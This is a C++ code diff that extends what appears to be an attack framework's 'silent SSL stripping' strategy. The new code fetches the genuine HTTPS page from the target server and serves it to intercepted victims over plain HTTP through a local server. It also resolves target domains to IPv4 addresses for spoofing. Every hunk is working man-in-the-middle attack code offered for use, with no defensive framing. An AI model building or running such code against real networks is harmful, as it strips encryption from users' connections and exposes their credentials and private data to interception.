@@ -1,3 +1,4 @@
+#include "ssl_stripping/silent.h"
 #include "HttpLayer.h"
 #include "IPv4Layer.h"
 #include "IpAddress.h"
@@ -9,7 +10,6 @@
 #include "common/common.h"
 #include "log.h"
 #include "ssl_stripping/public.h"
-#include "ssl_stripping/silent.h"
 #include <algorithm>
 #include <boost/asio.hpp>
 #include <boost/asio/ssl.hpp>
@@ -24,6 +24,7 @@
 #include <thread>
 #include <unordered_set>
 #include <vector>
+
 
 #ifdef __linux__
 #include <signal.h>
@@ -41,7 +42,7 @@ struct HttpMessageData {
     std::condition_variable httpMessagesCV;
 };
 
-HttpMessageData& getHttpMessageData() {
+HttpMessageData &getHttpMessageData() {
     static HttpMessageData data;
     return data;
 }
@@ -59,26 +60,30 @@ void runHttpDummyServer() {
                 boost::asio::ip::tcp::socket socket(ioc);
                 acceptor.accept(socket);
 
-                auto& httpMessageData = getHttpMessageData();
+                auto &httpMessageData = getHttpMessageData();
 
                 // Wait for a packet size to be available
-                std::unique_lock<std::mutex> lock(httpMessageData.httpMessagesMutex);
-                httpMessageData.httpMessagesCV.wait(lock, [&]{ return !httpMessageData.httpMessages.empty(); });
-                
+                std::unique_lock<std::mutex> lock(
+                    httpMessageData.httpMessagesMutex);
+                httpMessageData.httpMessagesCV.wait(lock, [&] {
+                    return !httpMessageData.httpMessages.empty();
+                });
+
                 std::string httpMessage = httpMessageData.httpMessages.front();
                 httpMessageData.httpMessages.pop();
                 lock.unlock();
-                
+
                 std::ostringstream response;
                 response << "HTTP/1.1 200 OK\r\n"
-                        << "Content-Type: text/plain\r\n"
-                        << "Content-Length: " << httpMessage.length() << "\r\n"
-                        << "Connection: close\r\n"
-                        << "\r\n"
-                        << httpMessage;
+                         << "Content-Type: text/html\r\n"
+                         << "Content-Length: " << httpMessage.length() << "\r\n"
+                         << "Connection: close\r\n"
+                         << "\r\n"
+                         << httpMessage;
 
                 boost::system::error_code exc;
-                boost::asio::write(socket, boost::asio::buffer(response.str()), exc);
+                boost::asio::write(socket, boost::asio::buffer(response.str()),
+                                   exc);
 
                 socket.close();
             }
@@ -110,7 +115,10 @@ resolveDomainToIP(const std::string &domain, const std::string &service) {
 
         // Iterate through the resolved endpoints and extract IP addresses
         for (const auto &entry : endpoints) {
-            outputIps.insert(entry.endpoint().address().to_string());
+            const auto &addr = entry.endpoint().address();
+            if (addr.is_v4()) {
+                outputIps.insert(addr.to_string());
+            }
         }
 
     } catch (const boost::system::system_error &e) {
@@ -126,7 +134,7 @@ resolveDomainToIP(const std::string &domain, const std::string &service) {
     return outputIps;
 }
 
-void connectWithServer(const std::string &domain) {
+std::optional<std::string> connectWithServer(const std::string &domain) {
     try {
         const std::string HTTPS_PORT = "443";
 
@@ -171,13 +179,32 @@ void connectWithServer(const std::string &domain) {
         if (exc == boost::asio::error::eof) {
             LOG_INFO("Cleanly received response:");
             // Print the response headers and body
-            LOG_INFO(&response);
-        } else if (exc) {
+            std::istream response_stream(&response);
+            std::string line;
+            bool in_body = false;
+
+            std::ostringstream html_body;
+
+            while (std::getline(response_stream, line)) {
+                if (!in_body) {
+                    // Look for the blank line between headers and body
+                    if (line == "\r" || line == "") {
+                        in_body = true;
+                    }
+                } else {
+                    html_body << line << "\n";
+                }
+            }
+
+            return html_body.str();
+        }
+        if (exc) {
             throw boost::system::system_error(exc);
         }
-
+        return std::nullopt;
     } catch (std::exception &e) {
         LOG_ERROR("Exception: " + std::string(e.what()));
+        return std::nullopt;
     }
 }
 
@@ -232,16 +259,23 @@ void ATK::SSL::SilentSslStrippingStrategy::onPacketArrives(
 
             // Get the total packet size
             size_t packetSize = packet->getRawDataLen();
-            auto& httpMessageData = getHttpMessageData();
-            
+            auto &httpMessageData = getHttpMessageData();
+            std::optional<std::string> realHtmlFromServer =
+                connectWithServer(domain);
+            if (!realHtmlFromServer.has_value()) {
+                LOG_ERROR("Could not connect to server!");
+                continue;
+            }
+
             // Add packet size to queue for HTTP response
             {
-                std::lock_guard<std::mutex> lock(httpMessageData.httpMessagesMutex);
-                httpMessageData.httpMessages.emplace("Hello from the other side!, also packet size = " + std::to_string(packetSize) + "\n");
+                std::lock_guard<std::mutex> lock(
+                    httpMessageData.httpMessagesMutex);
+                httpMessageData.httpMessages.emplace(
+                    realHtmlFromServer.value() + "\n");
             }
             httpMessageData.httpMessagesCV.notify_one();
-            
-            LOG_INFO("Packet size added to queue: " + std::to_string(packetSize));
+
         }
     }
 }
@@ -268,6 +302,10 @@ void ATK::SSL::SilentSslStrippingStrategy::execute() {
                     ipsToSpoofCommaSeparated += ',';
                 }
             }
+        }
+        if (ipsToSpoofCommaSeparated.empty()) {
+            throw std::runtime_error(
+                "Unable to resolve any IPv4 addresses from domains provided");
         }
         ipsToSpoofCommaSeparated.pop_back();
 
